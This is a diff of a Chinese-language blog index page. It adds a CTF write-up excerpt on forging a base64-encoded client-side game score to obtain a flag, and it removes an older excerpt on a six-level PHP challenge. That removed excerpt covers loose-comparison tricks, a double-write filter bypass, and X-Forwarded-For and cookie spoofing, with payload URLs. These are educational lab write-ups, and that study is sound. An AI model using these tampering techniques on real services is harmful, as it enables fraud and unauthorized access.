@@ -2871,6 +2871,132 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-10-28 00:00:00+00:00">2026-10-28</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../../../category/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB/" class="md-meta__link">客户端信任</a>, 
+              <a href="../../../../category/js/" class="md-meta__link">JS</a>, 
+              <a href="../../../../category/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="md-meta__link">逻辑漏洞</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="stage3"><a class="toclink" href="../../../../zerog2026-stage3/">Stage3 — 重生之我在零重力屋顶当"卷王"</a></h2>
+<p>题目是个小游戏：控制碰星娘飞过星环，<strong>攒到 3000 分</strong>才能领终点奖励。</p>
+<h3 id="f12"><a class="toclink" href="../../../../zerog2026-stage3/#f12">做这种题的第一步：F12</a></h3>
+<p><strong>做这种类型的题目，重要的是打开 F12、打开 Network，先玩一局，看它都发送了哪些请求。</strong></p>
+<p><img alt="Network 面板" src="../../../../../assets/images/zerog2026-stage3/01-network.png" /></p>
+<p>一局下来就两个请求：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>POST /api/run     201    开局
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>POST /api/claim   403    结算
+</span></code></pre></div>
+<h3 id="claim"><a class="toclink" href="../../../../zerog2026-stage3/#claim">盯住 claim</a></h3>
+<p><code>claim</code> 出现了 <code>grades</code> 这个字段，<strong>对其进行 base64 解码</strong>：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>eyJzY29yZSI6MH0=   →   {"score":0}
+</span></code></pre></div>
+<p><strong>这不就是我的得分吗？那这里就明确了。</strong></p>
+<p><img alt="claim 的请求体" src="../../../../../assets/images/zerog2026-stage3/02-request.png" /></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="p">{</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="w">  </span><span class="nt">"runId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"9b337580-62ae-4e0a-9a90-96a5e17095ad"</span><span class="p">,</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="w">  </span><span class="nt">"grades"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eyJzY29yZSI6MH0="</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>分数是浏览器自己算出来、自己 base64 一下、再交给服务器的 —— 服务器完全相信这个数字。</strong></p>
+<p><strong>base64 只是编码，不是加密，也不是签名。</strong></p>
+<p><strong>⚠️ 有个先后依赖：<code>/api/run</code> 返回的不只是 <code>runId</code>，还有 <code>expiresInSeconds: 1800</code>（30 分钟有效）。</strong></p>
+<p><strong>所以不能只发 <code>claim</code> —— 得先拿一个有效的 <code>runId</code>，再拿它去结算。</strong></p>
+<h3 id="_1"><a class="toclink" href="../../../../zerog2026-stage3/#_1">改分数</a></h3>
+<p><strong>直接修改分数为 3000，再做一次 base64 编码，抓包改掉 <code>grades</code>，发回去：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>{"score":3000}  →  eyJzY29yZSI6MzAwMH0=
+</span></code></pre></div>
+<p><strong>成功得到 flag。</strong></p>
+<p><img alt="成功响应" src="../../../../../assets/images/zerog2026-stage3/03-flag.png" /></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">{</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="w">  </span><span class="nt">"ok"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="w">  </span><span class="nt">"code"</span><span class="p">:</span><span class="w"> </span><span class="s2">"TARGET_REACHED"</span><span class="p">,</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">  </span><span class="nt">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"终点信号已解锁"</span><span class="p">,</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="w">  </span><span class="nt">"score"</span><span class="p">:</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="w">  </span><span class="nt">"target"</span><span class="p">:</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">  </span><span class="nt">"flag"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ZeroG{...}"</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="base64"><a class="toclink" href="../../../../zerog2026-stage3/#base64">补充：为什么 base64 挡不住</a></h3>
+<p>这段代码其实自己就写着答案：</p>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">encodeGrades</span><span class="p">(</span><span class="nx">score</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">btoa</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">score</span><span class="w"> </span><span class="p">}));</span><span class="w">   </span><span class="c1">// btoa = base64 编码</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>函数名是 <code>encode</code>，不是 <code>sign</code>。</strong></p>
+<p><strong>这四个词的区别值得记：</strong></p>
+<table>
+<thead>
+<tr>
+<th>词</th>
+<th>含义</th>
+<th>能不能防改</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>encode</code></td>
+<td><strong>编码</strong>（base64、hex、URL）</td>
+<td>❌ 只是换衣服，谁都能脱</td>
+</tr>
+<tr>
+<td><code>encrypt</code></td>
+<td><strong>加密</strong>（AES、RSA）</td>
+<td>✅ 但要密钥</td>
+</tr>
+<tr>
+<td><code>hash</code></td>
+<td><strong>哈希</strong>（md5、sha256）</td>
+<td>✅ 单向，但这里只存不比对</td>
+</tr>
+<tr>
+<td><code>sign</code></td>
+<td><strong>签名</strong>（HMAC、RSA 签名）</td>
+<td>✅ <strong>改了就对不上</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>只有最后一种能真正防篡改 —— 因为它需要服务器持有的密钥，前端拿不到。</strong></p>
+<h3 id="_2"><a class="toclink" href="../../../../zerog2026-stage3/#_2">这类题的通法</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>① F12 → Network，玩一局，看发了哪些请求
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>② 找到"提交结果"的那个请求
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>③ 看提交的字段是怎么产生的：
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>     · 明文？          → 直接改
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>     · base64 / hex？  → 编码而已，解开改
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>     · 带签名？        → 找密钥（前端藏了也能拿到）
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>     · 服务器发的 token？→ 看能不能复用
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>④ 这个值是服务器算的，还是浏览器算的？
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>     浏览器算的 → 一定能伪造
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>     服务器算的 → 得去找逻辑漏洞
+</span></code></pre></div>
+<p><strong>这道题属于第 ④ 条最简单的那种：分数完完全全是浏览器算的。</strong></p>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-10-27 00:00:00+00:00">2026-10-27</time></li>
         
           <li class="md-meta__item">
@@ -4026,172 +4152,6 @@ Firefox：存储 → Cookie</p>
 <p><strong>和路径遍历那六关是同一个模型：</strong>校验发生在哪一步，绕过就发生在哪一步之前。</p>
 <p><strong>② 还有个没被用上的口子</strong></p>
 <p>第 ③ 轮是 <code>urldecode</code> 之后才截断 —— 这意味着 <code>%3f</code> 编码的问号也能触发截断。这次没用上，但换一道题可能就得靠它。</p>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../../../category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/" class="md-meta__link">新手入门</a>, 
-              <a href="../../../../category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-meta__link">代码执行</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 3 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="_1"><a class="toclink" href="../../../../mimi-adventure/">米米的奇幻之旅（六关）</a></h2>
-<p>第一题米米的奇幻之旅，一共六关，都是很基础的东西。</p>
-<p><img alt="第一关" src="../../../../../assets/images/mimi-adventure/01-level1.png" /></p>
-<h3 id="_2"><a class="toclink" href="../../../../mimi-adventure/#_2">第一关 · 数字=字符串的魔法</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="x">if($_GET['step1']=='2026'){</span>
-</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="x">    echo '第一关通过！';</span>
-</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="x">}</span>
-</span></code></pre></div>
-<p>首先是一个 PHP 弱比较，直接构造 payload：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>/?step1=2026
-</span></code></pre></div>
-<p><strong>过。</strong></p>
-<h3 id="_3"><a class="toclink" href="../../../../mimi-adventure/#_3">第二关 · 穿越消失的文字</a></h3>
-<p><img alt="第二关" src="../../../../../assets/images/mimi-adventure/02-level2.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="x">$key=$_GET['step2'];</span>
-</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="x">$key=str_replace('flag', '', $key);</span>
-</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="x">if($key==='flag'){</span>
-</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="x">    success;</span>
-</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="x">}</span>
-</span></code></pre></div>
-<p>这关会把 <code>flag</code> 字符替换为空，注意<strong>替换之后拼起来还是 <code>flag</code></strong>，所以双写绕过：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>/?step1=2026&amp;step2=fflaglag
-</span></code></pre></div>
-<div class="admonition warning">
-<p class="admonition-title">纠正一个常见误解</p>
-<p><code>str_replace('flag','',$key)</code> 默认替换<strong>所有</strong>匹配，不是只替换一次。</p>
-<p>双写之所以有效，是因为 <code>fflaglag</code> 里只有<strong>一个</strong> <code>flag</code> 子串（不重叠）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>f f l a g l a g
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>  └─flag─┘              ← 只有这一处
-</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>删掉后 → f + lag = fla g → 又拼回 "flag"
-</span></code></pre></div>
-<p>实测：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>原串: fflaglag
-</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>删掉 'flag' 后: [flag]
-</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>含 'flag' 出现次数 = 1
-</span></code></pre></div>
-</div>
-<h3 id="_4"><a class="toclink" href="../../../../mimi-adventure/#_4">第三关 · 来自本机的访客</a></h3>
-<p><img alt="第三关" src="../../../../../assets/images/mimi-adventure/03-level3.png" /></p>
-<p>提示伪造地址，在 Burp Suite 抓包后在请求头里加上一行：</p>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="err">X-Forwarded-For: 127.0.0.1</span>
-</span></code></pre></div>
-<p><strong>过。</strong></p>
-<h3 id="_5"><a class="toclink" href="../../../../mimi-adventure/#_5">第四关 · 管理员身份卡</a></h3>
-<p><img alt="第四关" src="../../../../../assets/images/mimi-adventure/04-level4.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="x">if($_COOKIE['admin']=='1'){</span>
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="x">    success;</span>
-</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="x">}</span>
-</span></code></pre></div>
-<p>Cookie 就是浏览器用来判断用户身份的，所以直接把 cookie 里的全删了，改为：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>admin=1
-</span></code></pre></div>
-<p><strong>过。</strong></p>
-<h3 id="_6"><a class="toclink" href="../../../../mimi-adventure/#_6">第五关 · 来自东方的语言</a></h3>
-<p><img alt="第五关" src="../../../../../assets/images/mimi-adventure/05-level5.png" /></p>
-<p>这关说只接待来自喵星的访客，要「语言标记」。</p>
-<p><code>zh-CN</code> 在 <code>Accept-Language</code> 里面已经有了，所以直接把 <code>miao</code> 添加在后面：</p>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="err">Accept-Language: zh-CN,zh;q=0.9,...,miao</span>
-</span></code></pre></div>
-<p><strong>过。</strong></p>
-<h3 id="boss"><a class="toclink" href="../../../../mimi-adventure/#boss">第六关 · 最终 Boss 喵</a></h3>
-<p><img alt="第六关" src="../../../../../assets/images/mimi-adventure/06-level6.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="x">$pwd=$_GET["pwd"];</span>
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="x">if($pwd==0 &amp;&amp; strlen($pwd)&gt;0){</span>
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="x">    flag</span>
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="x">}</span>
-</span></code></pre></div>
-<p>说要既满足等于 0 又要长度大于 0，那不就是 <code>0</code> 吗：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
-</span></code></pre></div>
-<p><strong>过了。</strong></p>
-<h3 id="_7"><a class="toclink" href="../../../../mimi-adventure/#_7">第六关的考点（当时没想明白）</a></h3>
-<p>一开始觉得「这不就是 0 吗」，后来明白出题人想考的其实是 <strong><code>==</code> 松散比较的坑</strong>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="x">var_dump("abc" == 0);    // PHP 7 下 → bool(true)</span>
-</span></code></pre></div>
-<p><strong>在 PHP 7 里，任意「非数字字符串」和 0 做 <code>==</code> 比较，结果都是 <code>true</code>。</strong></p>
-<p>所以第六关的正确解法其实非常多：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>?pwd=0        ← 我用的,长度 1,数值也是 0
-</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>?pwd=abc      ← 更"标准"的答案,长度 3,但 == 0 为真
-</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>?pwd=admin    ← 一样能过
-</span></code></pre></div>
-<p><code>pwd=0</code> 只是碰巧也对，<strong>真正的知识点是 <code>"任意字符" == 0 为 true</code></strong>。</p>
-<p>（PHP 8 之后这个坑被修了，<code>"abc" == 0</code> 变成 <code>false</code>。）</p>
-<h3 id="payload"><a class="toclink" href="../../../../mimi-adventure/#payload">最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
-</span></code></pre></div>
-<p><img alt="拿到 flag" src="../../../../../assets/images/mimi-adventure/07-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>flag{4a950787-6159-4af4-adea-c8a40ffd8e34}
-</span></code></pre></div>
-<h3 id="_8"><a class="toclink" href="../../../../mimi-adventure/#_8">六关小结</a></h3>
-<table>
-<thead>
-<tr>
-<th>关</th>
-<th>考点</th>
-<th>一句话</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td><code>==</code> 弱比较</td>
-<td>数字和字符串可以相等</td>
-</tr>
-<tr>
-<td>2</td>
-<td>双写绕过</td>
-<td>删掉中间的，前后又拼回来</td>
-</tr>
-<tr>
-<td>3</td>
-<td><code>X-Forwarded-For</code></td>
-<td>服务器信的 IP 可以伪造</td>
-</tr>
-<tr>
-<td>4</td>
-<td><code>Cookie</code></td>
-<td>身份放客户端 = 没有校验</td>
-</tr>
-<tr>
-<td>5</td>
-<td><code>Accept-Language</code></td>
-<td>语言标记也是可伪造的输入</td>
-</tr>
-<tr>
-<td>6</td>
-<td><code>== 0</code></td>
-<td>任意非数字字符串都等于 0（PHP 7）</td>
-</tr>
-</tbody>
-</table>
-<p><strong>第 3、4、5 关其实是同一个病根：</strong>服务端信任了客户端可控的输入（IP 头、Cookie、语言标记）。</p>
-<p><strong>第 1 和第 6 关是同一个病根：</strong><code>==</code> 松散比较。</p>
     
     
   </div>
